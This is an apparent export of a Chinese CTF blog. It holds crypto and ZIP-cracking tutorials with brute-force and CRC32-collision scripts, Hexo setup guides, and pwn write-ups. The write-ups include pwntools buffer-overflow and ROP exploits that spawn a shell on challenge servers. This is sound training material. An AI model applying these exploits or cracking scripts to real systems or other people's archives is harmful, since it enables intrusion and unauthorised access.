[{"title":"不仅仅是Morse","url":"/2021/09/19/不仅仅是Morse/","content":"\n[不仅仅是Morse](https://adworld.xctf.org.cn/task/answer?type=crypto&number=5&grade=0&id=5117&page=1)\n\n<!-- more -->\n\n附件下载，是一个txt文件，得到一串密文：\n\n```text\n--/.-/-.--/..--.-/-..././..--.-/..../.-/...-/./..--.-/.-/-./---/-/...././.-./..--.-/-.././-.-./---/-.././..../..../..../..../.-/.-/.-/.-/.-/-.../.-/.-/-.../-.../-.../.-/.-/-.../-.../.-/.-/.-/.-/.-/.-/.-/.-/-.../.-/.-/-.../.-/-.../.-/.-/.-/.-/.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../-.../.-/.-/.-/-.../-.../.-/.-/-.../.-/.-/.-/.-/-.../.-/-.../.-/.-/-.../.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/-.../-.../.-/.-/-.../-.../-.../.-/-.../.-/.-/.-/-.../.-/-.../.-/-.../-.../.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/.-/.-/.-/-.../-.../.-/-.../-.../.-/.-/-.../-.../.-/.-/-.../.-/.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/-.../.-/.-/-.../-.../.-/-.../.-/.-/.-/.-/-.../-.../.-/-.../.-/.-/-.../-.../.-\n```\n\n按照`/`来分割，得到一串摩斯密码：\n\n```text\nn```\n\n摩丝密码转换，得到：\n\n```text\nMAY_BE_HAVE_ANOTHER_DECODEHHHHAAAAABAABBBAABBAAAAAAAABAABABAAAAAAABBABAAABBAAABBAABAAAABABAABAAABBABAAABAAABAABABBAABBBABAAABABABBAAABBABAAABAABAABAAAABBABBAABBAABAABAAABAABAABAABABAABBABAAAABBABAABBA\n```\n\n提取有效信息，进行培根密码解密：\n\n```text\n密文：AAAAABAABBBAABBAAAAAAAABAABABAAAAAAABBABAAABBAAABBAABAAAABABAABAAABBABAAABAAABAABABBAABBBABAAABABABBAAABBABAAABAABAABAAAABBABBAABBAABAABAAABAABAABAABABAABBABAAAABBABAABBA\n明文：ATTACKANDDEFENCEWORLDISINTERESTING\n转换小写：attackanddefenceworldisinteresting\n```\n\n包上格式，得到flag:~~cyberpeace{attackanddefenceworldisinteresting}~~\n\n","categories":["Crypto","摩斯密码"]},{"title":"Misc-压缩包类分析","url":"/2021/09/19/Misc-压缩包类分析/","content":">在Misc领域中，关于压缩包的知识是很基本的，近几年被考烂的；但同时也是每位Misc手，乃至每位CTFer都应该了解的重要知识点。在Misc领域，关于压缩包分析的知识可以说占了一大部分。而其中又包括了像文件数据结构的识别、 CRC数据校验算法等等知识点。\n>\n>压缩包分析的题目属于刷一定数量的题目之后，就容易上手的题目，但往往选手也容易忽视掉基础理论知识的重要性，那么这篇文章将由浅入深地讲解这方面的理论知识。\n\n# 常见压缩包格式和文件结构\n虽说平时大家看文件类型都是靠文件后缀，但是这里是CTF，什么情况都有可能出来，所以拿到题目附件之后，应当先准确判断文件类型，确认是压缩包类后再考虑接下来的做法。\n## ZIP文件\nZIP文件格式是一种数据压缩和文档储存的文件格式，原名Deflate，发明者为菲尔·卡茨（Phil Katz），他于1989年1月公布了该格式的资料。ZIP通常使用后缀名“.zip”，它的`MIME`格式为`application/zip`。\n\n### zip文件结构\n\n这里拿一个小的测试用zip文件举例：\n\n#### zip文件源数据区 \n\n![image-20210918210114460](C:\\Users\\24743\\Desktop\\CTF\\Misc-压缩包类分析.assets\\image-20210918210114460.png)\n\n![image-20210919105714632](C:\\Users\\24743\\Desktop\\CTF\\Misc-压缩包类分析.assets\\image-20210919105714632.png)\n\n>struct ZIPFILERECORD record\n\n| HEX数据     | 描述                                           | 010Editor模板数据           |\n| ----------- | ---------------------------------------------- | --------------------------- |\n| 50 4B 03 04 | zip文件头标记，看文本的话就是PK开头            | char frSignature[4]         |\n| 0A 00       | 解压文件所需 pkware 版本                       | ushort frVersion            |\n| 00 00       | 全局方式位标记（有无加密），头文件标记后2bytes | ushort frFlags              |\n| 00 00       | 压缩方式                                       | enum COMPTYPE frCompression |\n| E8 A6       | 最后修改文件时间                               | DOSTIME frFileTime          |\n| 32 53       | 最后修改文件日期                               | DOSDATE frFileDate          |\n| 0C 7E 7F D8 | CRC-32校验                                     | uint frCrc                  |\n\n#### zip文件源数据目录区 \n\n>struct ZIPDIRENTRY dirEntry\n\n![image-20210918211236766](C:\\Users\\24743\\Desktop\\CTF\\Misc-压缩包类分析.assets\\image-20210918211236766.png)\n\n![image-20210919105803076](C:\\Users\\24743\\Desktop\\CTF\\Misc-压缩包类分析.assets\\image-20210919105803076.png)\n\n| HEX数据     | 描述                                             | 010Editor模板数据           |\n| ----------- | ------------------------------------------------ | --------------------------- |\n| 50 4B 01 02 | 目录中文件文件头标记                             | char deSignature[4]         |\n| 3F 00       | 压缩使用的 pkware 版本                           | ushort deVersionMadeBy      |\n| 0A 00       | 解压文件所需 pkware 版本                         | ushort deVersionToExtract   |\n| 00 00       | 全局方式位标记（有无加密），目录文件标记后4bytes | ushort frFlags              |\n| 00 00       | 压缩方式                                         | enum COMPTYPE frCompression |\n| E8 A6       | 最后修改文件时间                                 | DOSTIME frFileTime          |\n| 32 53       | 最后修改文件日期                                 | DOSDATE frFileDate          |\n| 0C 7E 7F D8 | CRC-32校验                                       | uint frCrc                  |\n\n#### zip文件源数据目录结束区 \n\n>struct ZIPENDLOCATOR endLocator![image-20210918211925313](C:\\Users\\24743\\Desktop\\CTF\\Misc-压缩包类分析.assets\\image-20210918211925313.png)\n\n| HEX数据     | 描述               | 010Editor模板数据        |\n| ----------- | ------------------ | ------------------------ |\n| 50 4B 05 06 | 目录结束标记       | char elSignature[4]      |\n| 00 00       | 当前磁盘编号       | ushort elDiskNumber      |\n| 00 00       | 目录区开始磁盘编号 | ushort elStartDiskNumber |\n\n> 对于多文件的压缩包，其结构不会如此简单，但按照格式依然可以对照得出：\n>\n> ![image-20210918213503251](C:\\Users\\24743\\Desktop\\CTF\\Misc-压缩包类分析.assets\\image-20210918213503251.png)\n\n### zip文件常见考点\n\n#### zip伪加密\n\n~~***为什么不试试WinRAR的修复功能一把梭呢***~~\n\nzip文件的伪加密，正如他的名字，即虽然zip文件本身没有加密，但是通过修改zip文件中的标记数据，让解压软件认为文件存在加密，故达到了伪加密的效果。而标记zip文件是否加密的标记，则是上文中`zip文件源数据区`中的`ushort frFlags`（全局标记文件是否加密）和`zip文件源数据目录区`中的`ushort frFlags`（全局标记文件是否加密，伪加密的关键点）两个位置。\n\n\n在正常加密的情况下，两个（多个）的加密标志点应当是同一个数据，然而在一般的zip伪加密中，往往`zip文件源数据区`中的`ushort frFlags`数据点为0，即标志着文件不存在加密，但是`zip文件源数据目录区`中的`ushort frFlags`数据点不为0，标志着文件存在加密。这样前后标志冲突，软件会认为zip文件存在加密，但是无论用什么密码都无法解压，因为文件数据根本没有加密。\n\n在这种情况下，可以选择使用16进制编辑工具（推荐`010 Editor`，用模板功能可以方便地定位标志数据的位置）来手动编辑文件数据，通过将`zip文件源数据目录区`中的`ushort frFlags`数据点中的数据全部改为0，即可让文件认为文件不存在加密方式，就可以顺利解出数据。\n\n##### 例题\n\n[BUUCTF-zip伪加密](https://buuoj.cn/challenges#zip%E4%BC%AA%E5%8A%A0%E5%AF%86)\n\n这道题的zip附件下载下来直接解压，会发现解压出的flag.txt文件为空白，并提示输入密码。用十六进制编辑器看一下zip文件的数据：\n\n![image-20210918215518320](C:\\Users\\24743\\Desktop\\CTF\\Misc-压缩包类分析.assets\\image-20210918215518320.png)\n\n看起来不像伪加密，但是根据题目提示，尝试把所有加密标记点改为0：\n\n![image-20210918215633656](C:\\Users\\24743\\Desktop\\CTF\\Misc-压缩包类分析.assets\\image-20210918215633656.png)\n\n再尝试解压，便可以成功解压。\n\n##### 自动脚本\n\n```python\nimport struct\nout_HEX = []\nhead = [b'P', b'K']\n\n\ndef main():\n    print(\"$ zip伪加密自动解密脚本 $\",end=\"\\n\\n\")\n    infile = open(\"D:\\\\Downloads\\\\test.zip\", \"rb\")\n    i: int = 0\n    while i <= 1:\n        c = infile.read(1)\n        # print(c)\n        if c == head[i]:\n            out_HEX.append(ord(c))\n        else:\n            exit()\n        i += 1\n    while 1:\n        c = infile.read(1)\n        if not c:\n            break\n        out_HEX.append(ord(c))\n    infile.close()\n    # print(out_HEX)\n\n    len_out = len(out_HEX)\n    i: int = 0\n    while i < len_out:\n        if out_HEX[i] == 80 and out_HEX[i+1] == 75 and out_HEX[i+2] == 3 and out_HEX[i+3] == 4: # zip文件源数据区\n            print(\"zip文件源数据区： \",end=\"\")\n            for letter in out_HEX[i:i+4]:\n                print(letter,end=\" \")\n            print(\"-->\",end=\" \")\n            for letter in out_HEX[i:i+4]:\n                print(hex(letter),end=\" \")\n            print(\"\")\n            print(\"zip文件源数据区加密状态： \",end=\"\")\n            print(str(out_HEX[i+6])+\" \"+str(out_HEX[i+7]))\n            print(\"\\n\")\n            out_HEX.pop(i+6)\n            out_HEX.insert(i+6,0)\n            out_HEX.pop(i+7)\n            out_HEX.insert(i+7,0)\n        elif out_HEX[i] == 80 and out_HEX[i+1] == 75 and out_HEX[i+2] == 1 and out_HEX[i+3] == 2: # zip文件源数据目录区\n            print(\"zip文件源数据目录区 \",end=\"\")\n            for letter in out_HEX[i:i+4]:\n                print(letter,end=\" \")\n            print(\"-->\",end=\" \")\n            for letter in out_HEX[i:i+4]:\n                print(hex(letter),end=\" \")\n            print(\"\")\n            print(\"zip文件源数据目录区加密状态： \",end=\"\")\n            print(str(out_HEX[i+6])+\" \"+str(out_HEX[i+7]))\n            print(\"\\n\")\n            out_HEX.pop(i+8)\n            out_HEX.insert(i+8,0)\n            out_HEX.pop(i+9)\n            out_HEX.insert(i+9,0)\n        i += 1\n\n    with open(\"D:\\\\Downloads\\\\out.zip\", \"wb\") as outfile:\n        for bytes_ in out_HEX:\n            # print(bytes_)\n            # print(struct.pack(\"B\", bytes_))\n            outfile.write(struct.pack(\"B\", bytes_))\n        print(\"文件已解密\")\n\n\nif __name__ == '__main__':\n    main()\n\n\n```\n\n#### 爆破\n\n直接爆破密码可能是最常见，也是最无脑的zip文件考点了，现在依靠`ARCHPR`和`fcrackzip`这类工具，已经完全不需要用户手动编写脚本，单单依靠工具便可以十分轻松地暴力破解脚本。\n\n![image-20210919085438424](C:\\Users\\24743\\Desktop\\CTF\\Misc-压缩包类分析.assets\\image-20210919085438424.png)\n\n```shell\nrandark@randark-VirtualBox:~$ fcrackzip --help\n\nfcrackzip version 1.0, a fast/free zip password cracker\nwritten by Marc Lehmann <pcg@goof.com> You can find more info on\nhttp://www.goof.com/pcg/marc/\n\nUSAGE: fcrackzip\n          [-b|--brute-force]            use brute force algorithm\n          [-D|--dictionary]             use a dictionary\n          [-B|--benchmark]              execute a small benchmark\n          [-c|--charset characterset]   use characters from charset\n          [-h|--help]                   show this message\n          [--version]                   show the version of this program\n          [-V|--validate]               sanity-check the algorithm\n          [-v|--verbose]                be more verbose\n          [-p|--init-password string]   use string as initial password/file\n          [-l|--length min-max]         check password with length min to max\n          [-u|--use-unzip]              use unzip to weed out wrong passwords\n          [-m|--method num]             use method number \"num\" (see below)\n          [-2|--modulo r/m]             only calculcate 1/m of the password\n          file...                    the zipfiles to crack\n\nmethods compiled in (* = default):\n\n 0: cpmask\n 1: zip1\n*2: zip2, USE_MULT_TAB\n\n\n```\n\n\n\n##### 纯暴力\n\n同字面意思，尝试所有可能选项来爆破压缩包密码，耗时随密码复杂度和密码长度而无限增长。一般纯暴力破解的题目，密码的长度一般不会超过6位纯数字。\n\n用`fcrackzip`破解6位纯数字加密：\n\n```shell\nfcrackzip -v -b -u -c1 a -p aaaaaa test.zip \n```\n\n~~*我个人还是感觉`ARCHPR`好用*~~\n\n##### 掩码\n\n原理其实和纯暴力大同小异，但是由于知道了部分密码，从而可以选择对密码的特定位置进行枚举爆破。\n\n例如，对于密码：\n\n```text\nthis_it_a_password\n```\n\n题目可能只会提示：\n\n```text\nthis_??_a_pa?????d\n```\n\n那么问号中的字符就需要选手枚举破解。\n\n##### 自动脚本\n\n~~*有工具还要脚本干嘛*~~\n\n#### CRC32爆破\n\n`CRC` 本身是「冗余校验码」的意思，`CRC32` 则表示会产生一个 `32 bit` ( `8` 位十六进制数) 的校验值。由于 `CRC32` 产生校验值时源数据块的每一个 `bit` (位) 都参与了计算，所以数据块中即使只有一位发生了变化，也会得到不同的 `CRC32` 值。\n\n值得注意的是 ，`zip` 中的 `CRC32` 是未加密文件的校验值。也就意味着可以对小文件直接进行CRC32碰撞，从而得到文件的真实内容。这也就导致了基于 `CRC32爆破` 的攻击手法。\n以下为`CRC32爆破`的特征\n\n- 文件内内容很少 (一般比赛中大多为 `4` 字节左右)\n-  加密的密码很长，几乎不能直接暴力破解\n\n##### 例题\n\n[BUUCTF-zip](https://buuoj.cn/challenges#zip)\n\n附件下载解压，得到了一堆压缩包：\n\n![image-20210919102026118](C:\\Users\\24743\\Desktop\\CTF\\Misc-压缩包类分析.assets\\image-20210919102026118.png)\n\n尝试纯暴力破解，发现不行，看一下文件大小，发现文件数据仅仅4b，可以断定是CRC32爆破：\n\n![image-20210919102134438](C:\\Users\\24743\\Desktop\\CTF\\Misc-压缩包类分析.assets\\image-20210919102134438.png)\n\n针对单个文件写个CRC32碰撞脚本：\n\n```python\nimport zipfile\nimport string\nimport binascii\n\ndef CrackCrc(crc):\n    for i in dic:\n        for j in dic:\n            for k in dic:\n                for h in dic: # 四个循环对应文件大小为4b\n                    s = i + j + k + h\n                    if crc == (binascii.crc32(s.encode())):\n                        f.write(s)\n                        return\n\ndic = string.ascii_letters + string.digits + '+/='\nwith open('D:\\\\Downloads\\\\b2ca8799-13d7-45df-a707-94373bf2800c\\\\out.txt', 'w') as f:\n    print(\"CRC32begin\")\n    file = \"D:\\\\Downloads\\\\b2ca8799-13d7-45df-a707-94373bf2800c\\\\\"+'out1.zip'\n    crc = zipfile.ZipFile(file, 'r').getinfo('data.txt').CRC\n    CrackCrc(crc)\n    print(\"CRC32finished\")\n```\n\n再写一个大循环把所有文件批量处理，并且加上进度条：\n\n```python\nimport zipfile\nimport string\nimport binascii\n\ndef CrackCrc(crc):\n    for i in dic:\n        for j in dic:\n            for k in dic:\n                for h in dic:\n                    s = i + j + k + h\n                    if crc == (binascii.crc32(s.encode())):\n                        f.write(s)\n                        return\n\ndef CrackZip():\n    for i in range(0, 68):\n        file = \"D:\\\\Downloads\\\\b2ca8799-13d7-45df-a707-94373bf2800c\\\\\"+'out' + str(i) + '.zip'\n        crc = zipfile.ZipFile(file, 'r').getinfo('data.txt').CRC\n        CrackCrc(crc)\n        print('\\r' + \"loading：{:%}\".format(float((i + 1) / 68)), end='')\n\ndic = string.ascii_letters + string.digits + '+/='\nwith open('D:\\\\Downloads\\\\b2ca8799-13d7-45df-a707-94373bf2800c\\\\out.txt', 'w') as f:\n    print(\"CRC32 begin\")\n    CrackZip()\n    print(\"CRC32 finished\")\n    f.close()\n```\n\n运行脚本，便可以得到zip文件解密后的数据。\n\n##### 自动脚本\n\n```python\nimport zipfile\nimport string\nimport binascii\n\ndef CrackCrc(crc):\n    for i in dic:\n        for j in dic:\n            for k in dic:\n                for h in dic: # 循环个数取决于CRC32破解的目标文件大小\n                    s = i + j + k + h\n                    if crc == (binascii.crc32(s.encode())):\n                        f.write(s)\n                        return\n\ndic = string.ascii_letters + string.digits + '+/='\nwith open('out.txt', 'w') as f:\n    print(\"CRC32begin\")\n    file = \"res.zip'\n    crc = zipfile.ZipFile(file, 'r').getinfo('data.txt').CRC\n    CrackCrc(crc)\n    print(\"CRC32finished\")\n```\n\n\n\n#### 明文攻击\n\n类似于`CRC32破解`，但是明文攻击针对的是较大的文件（至少不能CRC32碰撞），并且已知其中一个文件的真实内容。\n\n-  一个加密的压缩文件\n- 知道压缩文件的压缩工具，比如 `2345` 好压， `WinRAR` ， `7z`，`zip` 等，可以通过文件属性了解。如果是 `Linux` 平台，用 `zipinfo -v` 可以查看一个 `zip` 包的详细信息，包括加密算法等\n- 知道压缩包里某个文件的部分连续内容 (至少 `12` 字节)\n\n如果你已经知道加密文件的部分内容，比如在某个网站上发现了它的 `readme.txt` 文件，你就可以开始尝试破解了。\n\n首先，将这个明文文件打包成与加密文件相同格式的包，比如将 `readme.txt` 打包成 `readme.zip` ，并且尽量用相同的软件（其实影响不大）。\n\n打包完成后，需要确认二者采用的压缩算法相同。一个简单的判断方法是用 `WinRAR` 打开文件，同一个文件压缩后的体积是否相同。如果相同，基本可以说明你用的压缩算法是正确的。如果不同，就尝试另一种压缩算法。\n\n然后使用`ARCHPR`或者`PKCrack`来进行明文破解\n\n~~*我个人还是喜欢用`ARCHPR`*~~\n\n##### 例题\n\n[[ACTF新生赛2020]明文攻击](https://buuoj.cn/challenges#[ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020]%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB)\n\n题目附件打开，提取出两个压缩包，其中一个带有加密，并且其中存放着flag，对比两个压缩包的文件信息：\n\n![image-20210919111018804](C:\\Users\\24743\\Desktop\\CTF\\Misc-压缩包类分析.assets\\image-20210919111018804.png)\n\n![image-20210919111028357](C:\\Users\\24743\\Desktop\\CTF\\Misc-压缩包类分析.assets\\image-20210919111028357.png)\n\n可以发现未加密的压缩包中的`flag.txt`文件的CRC32值与加密的压缩包中的相同，并且两个压缩包的格式相同，于是想到进行明文攻击：\n\n![image-20210919111255564](C:\\Users\\24743\\Desktop\\CTF\\Misc-压缩包类分析.assets\\image-20210919111255564.png)\n\n执行后便可以得到其中的加密文件。\n\n\n\n#### 压缩包嵌套\n\n这个就简单了，就是一个压缩包里面塞着另外一个压缩包，和俄罗斯套娃一样。可以手动解压，也可以用脚本。\n\n##### 例题\n\n[[MRCTF2020]千层套路](https://buuoj.cn/challenges#[MRCTF2020]%E5%8D%83%E5%B1%82%E5%A5%97%E8%B7%AF)\n\n```python\nimport zipfile\nname = '0573'\nwhile True:\n    fz = zipfile.ZipFile(name + '.zip', 'r')\n    fz.extractall(pwd=bytes(name, 'utf-8'))\n    name = fz.filelist[0].filename[0:4]\n    fz.close()\n```\n\n\n\n## RAR文件\n\n\n\n\n\n","categories":["Basic","Misc","TODO"]},{"title":"如何建站","url":"/2021/09/17/如何建站/","content":"\n\n> Hexo是一个基于nodejs 的快速生成静态博客的开源框架，而Github Pages是Github运营的一个静态网站托管服务，两者都是免费而灵活的开源项目，二者相结合便可以快速灵活地搭建属于自己的博客网站。\n<!-- more -->\n> 以下教程适用于Windows平台\n\n# 本地Hexo配置\n\n首先，先配置环境：\n\n1. 安装Node.js https://nodejs.org/zh-cn/ ，基本上装LTS版本，然后一路下一步就可以\n\n2. 安装Git https://git-scm.com/ ，这一步主要用来与Github Page同步\n\n3. 验证环境：\n\n   ```shell\n   node -v # 用于检验Node的安装\n   npm -v # 检验npm包管理器的安装\n   git --version # 检验Git的安装\n   # 以上三个命令只要返回了版本号，就基本上没有问题了\n   ```\n\n   在这里贴上我的返回：\n\n   ```shell\n   C:\\Users\\24743>node -v\n   v14.17.3\n   \n   C:\\Users\\24743>npm -v\n   6.14.13\n   \n   C:\\Users\\24743>git --version\n   git version 2.32.0.windows.2\n   # 版本号不一样没事，有返回值一般就没问题（也别用远古版本）\n   ```\n\n   \n\n然后安装Hexo：\n\n1. 打开Hexo官方网站：Hexo的官方网站是：https://hexo.io/zh-cn/\n\n2. 根据网页信息，依次执行以下命令：\n\n   ```shell\n   npm install -g hexo-cli #安装Hexo本体\n   hexo init <folder> # <folder>是你要存放Hexo文件的文件夹的路径\n   cd <folder> # 切换进Hexo文件夹\n   npm install # 加载npm相关文件\n   ```\n\n3. 打开Hexo文件夹内的<kbd>_config.yml</kbd>文件，按照\n\n","categories":["Basic"]},{"title":"Hexo X GitHub 联动确认！","url":"/2021/09/16/Hexo X GitHub 联动确认！/","content":"# 1 安装必要的插件  \n1. git插件 [https://www.git-scm.com/download/](https://www.git-scm.com/download/)  \n2. node.js插件 [https://nodejs.org/en/](https://nodejs.org/en/)  \n3. npm插件 包含在node.js插件中  \n4. 检测三种插件是否已成功安装：  \n\t>1. win+R输入cmd并运行打开命令符窗口  \n\t>2. 输入：  \n\t>3. git –version  \n\t>4. node -v  \n\t>5. npm -v  \n\t>6. 若均出现版本号则已安装成功  \n\n# 2 搭建GitHub仓库  \n1. 注册并登录GitHub后，点击个人头像旁的下三角，下拉菜单中选择Your repositories  \n2. 点击绿色的new创建属于自己的仓库  \n3. 在创建页面的Repository name栏中输入形同.github.io，其余均非必填项  \n4. 点击Create repository创建仓库  \n5. 注意事项：repository name务必为.github.io 关系到后期hexo导入  \n# 3 配置ssh密钥  \n1. 原因：每次向GitHub提交代码都需要经过你的账号验证，在未配置ssh密钥的情况下，需要每次都输入邮箱和密码，极为繁琐，配置ssh密钥能快速自动通过这一过程，加速代码更新  \n2. 查看本机中是否已经存在密钥：  \n\t```shell\n\tcd ~/.ssh #此命令在命令符窗口中运行 \n\t```\n3. 如果显示No such file则需要重新生成：  \n\t```shell\n\tssh-keygen -t rsa -C “邮箱地址”  \n\t```\n\t邮箱地址应为你的GitHub地址即username.github.io，随后ssh key将保存在C盘用户目录的.ssh文件夹中，路径大致为C:\\\\\\\\Users<你的电脑用户名>.ssh  \n4. 右键.ssh文件夹中的id_rsa.pub文件，在打开方式中选择用记事本打开，<kbd>Ctrl</kbd>+<kbd>A</kbd>全选内容，  \n<kbd>Ctrl</kbd>+<kbd>C</kbd>复制全部内容  \n5. 在GitHub中点击右上角的头像，下拉菜单中选择Setting，在左侧菜单中选择SSH and GPG keys  \n在顶部右侧选择绿色的New SSH key来新建ssh密钥  \n6. 随便起个title，在下方Ctrl+V粘贴你的ssh密钥  \n7. 点击Add SSH key完成对ssh密钥的添加  \n# 4 测试ssh密钥与GitHub绑定是否成功： \n打开命令符窗口，在其中输入：  \n```shell\nssh -T [git@github.com](mailto:git@github.com)  \n```\n若是显示Hi！……You have successfully…… 则已成功  \n# 5 绑定你的git和GitHub  \n1. 双击图标打开git bash  \n2. 在窗口中输入：  \n```shell\ngit config –global user.name “…..”  \ngit config –global user.email “...@….” #其中的…都为你自己的用户名和邮箱  \n```\n# 6 配置你的hexo  \n1. 安装hexo：  \n\t1. 打开git bash  \n\t2. 输入：npm install -g hexo  \n2. 建立一个新文件夹作为博客文件存放处  \n3. 右键该文件夹，选择git bash并输入：  \n```shell\nhexo init #此步为初始化hexo博客文件夹  \n```\n4. 博客文件夹初始化成功，其中应包含有：  \n```text\nnode_modules  \nscaffolds  \nsource #资源文件夹，内含有一个_posts文件夹，内含.md格式的博客文件  \nthemes #主题文件夹，用于存放各种主题，默认主题为landscape  \n.gitignore  \n_config.yml #接下来要编辑的配置文件  \ndb.json  \n……  \n```\n# 7 测试本地化启动博客：  \n1. 右键博客文件夹，选择git bash  \n2. 在其中输入：\n\t```shell  \n\thexo g #用于将source/_posts/xxx.md这一博客文件生成到自己的本地博客  \n\thexo d #用于启动本地博客服务器来访问博客，一旦关机或停止博客就无法访问  \n\t```\n3. 在浏览器中输入[http://localhost:4000来访问本地博客](http://localhost:4000来访问本地博客)  \n# 8 联动hexo与GitHub  \n1. 进入博客文件夹，右键config.yml文件，用记事本打开  \n2. 拉至最底部，将其最后的代码修改为：\n```yaml\ndeploy:  \n\ttype: git  \n\trepository: [git@github.com](mailto:git@github.com):/.github.io.git  \n\tbranch: <…> #此处填的内容为你GitHub仓库里branch左侧显示的文字  \n```\n通常为main或master，即此处填的为你的GitHub用户名  \n3. Ctrl+S保存文件  \n4. 右键博客文件夹，选择git bash  \n5. 输入：  \n\t```shell\n\thexo cl #清除博客缓存  \n\thexo g  \n\thexo d #将本地博客的文件上传至GitHub  \n\t```\n# 9 完成与debug  \n1. 打开http://username.github.io访问你自己的博客  \n2. 若第8步的5中代码出现报错，请检查代码是否正确及空格是否正确  \n3. 若短期内GitHub博客未成功更新，请通过shift+F5刷新浏览器缓存  \n4. 完成后就可以考虑对自己的博客进行精装修了（指更换主题）","categories":["其他"]},{"title":"jarvisoj_level0","url":"/2021/09/13/jarvisoj_level0/","content":"[题目链接](https://buuoj.cn/challenges#jarvisoj_level0)\n<!-- more -->\n先看一下保护信息：\n```c\nrandark@randark-VirtualBox:~/shared$ checksec level0\n[*] '/home/randark/shared/level0'\n    Arch:     amd64-64-little\n    RELRO:    No RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n```\n![](/images/Writeup/20210913122429.png)\nIDA打开看一下逻辑：\n![](/images/Writeup/20210913125113.png)\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  write(1, \"Hello, World\\n\", 0xDuLL);\n  return vulnerable_function(1LL);\n}\n```\n跟进函数：\n```c\nssize_t vulnerable_function()\n{\n  char buf[128]; // [rsp+0h] [rbp-80h] BYREF\n\n  return read(0, buf, 0x200uLL);\n}\n```\n利用read()函数实现栈溢出：\n![](/images/Writeup/20210913125352.png)\n![](/images/Writeup/20210913125415.png)\n![](/images/Writeup/20210913130012.png)\n构造Playload：\n```python\nfrom pwn import *\n\np = remote('node3.buuoj.cn', 25076)\n\npayload = 'a'*(0x80+8) + p64(0x400596)\np.sendline(payload)\np.interactive()\n```\n执行脚本，得到返回：\n```shell\nrandark@randark-VirtualBox:~/shared$ python Pwn.py\n[+] Opening connection to node4.buuoj.cn on port 25076: Done\n[*] Switching to interactive mode\nHello, World\n$ ls\nbin\nboot\ndev\netc\nflag\nflag.txt\nhome\nlib\nlib32\nlib64\nmedia\nmnt\nopt\nproc\npwn\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n$ cat /flag.txt\nflag{f6e2b4ad-6f56-4c6f-8d7a-df90f2abae35}\n$ \n[*] Interrupted\n[*] Closed connection to node4.buuoj.cn port 25076\n```\nflag:~~flag{f6e2b4ad-6f56-4c6f-8d7a-df90f2abae35}~~\n\n\n\n\n---\n参考：\n1.[jarvisoj_level0 ](https://www.cnblogs.com/vict0r/p/13806350.html)\n\n","categories":["Pwn","栈溢出"]},{"title":"bjdctf_2020_babystack","url":"/2021/09/13/bjdctf_2020_babystack/","content":"[题目链接](https://buuoj.cn/challenges#bjdctf_2020_babystack)\n<!-- more -->\n先看一下保护信息：\n![](/images/Writeup/20210913131053.png)\n```shell\nrandark@randark-VirtualBox:~/shared$ checksec bjdctf_2020_babystack\n[*] '/home/randark/shared/bjdctf_2020_babystack'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n```\nIDA打开看一下逻辑：\n![](/images/Writeup/20210913131210.png)\n可以看到应该是利用buf进行栈溢出：\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  char buf[12]; // [rsp+0h] [rbp-10h] BYREF\n  size_t nbytes; // [rsp+Ch] [rbp-4h] BYREF\n\n  setvbuf(stdout, 0LL, 2, 0LL);\n  setvbuf(stdin, 0LL, 1, 0LL);\n  LODWORD(nbytes) = 0;\n  read(0, buf, (unsigned int)nbytes);\n  return 0;\n}\n```\n![](/images/Writeup/20210913131328.png)\n依此构造playload：\n```python\nfrom pwn import *\n\np = remote('', )\npayload = 'a'*(0x10+8) + p32(0x4006E6)\n\np.sendline(payload)\np.interactive()\n```\n>在这里，发现脚本出问题，贴一个网上大佬的脚本：\n\n```python\nfrom pwn import *\n\ncontext(log_level = 'debug')\nproc_name = './bjdctf_2020_babystack'\nelf = ELF(proc_name)\n# p = process(proc_name)\np = remote('node4.buuoj.cn', 25434)\npop_ret = 0x400833\nsystem_addr = elf.sym['system']\nbin_sh_str = 0x400858\npayload = 'a'.encode() * (0x10 + 8) + p64(pop_ret) + p64(bin_sh_str) + p64(system_addr)\np.sendline(str(len(payload) + 1))\np.recvuntil('name?')\np.sendline(payload)\n\np.interactive()\n```\n得到返回值：\n```shell\nrandark@randark-VirtualBox:~/shared$ python Pwn.py\n[*] '/home/randark/shared/bjdctf_2020_babystack'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n[+] Opening connection to node4.buuoj.cn on port 25434: Done\nPwn.py:12: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  p.sendline(str(len(payload) + 1))\n[DEBUG] Sent 0x3 bytes:\n    b'49\\n'\nPwn.py:13: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  p.recvuntil('name?')\n[DEBUG] Received 0xfa bytes:\n    b'**********************************\\n'\n    b'*     Welcome to the BJDCTF!     *\\n'\n    b'* And Welcome to the bin world!  *\\n'\n    b\"*  Let's try to pwn the world!   *\\n\"\n    b'* Please told me u answer loudly!*\\n'\n    b'[+]Are u ready?\\n'\n    b'[+]Please input the length of your name:\\n'\n    b\"[+]What's u name?\\n\"\n[DEBUG] Sent 0x31 bytes:\n    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│\n    00000010  61 61 61 61  61 61 61 61  33 08 40 00  00 00 00 00  │aaaa│aaaa│3·@·│····│\n    00000020  58 08 40 00  00 00 00 00  90 05 40 00  00 00 00 00  │X·@·│····│··@·│····│\n    00000030  0a                                                  │·│\n    00000031\n[*] Switching to interactive mode\n\n$ ls\n[DEBUG] Sent 0x3 bytes:\n    b'ls\\n'\n[DEBUG] Received 0x6d bytes:\n    b'bin\\n'\n    b'boot\\n'\n    b'dev\\n'\n    b'etc\\n'\n    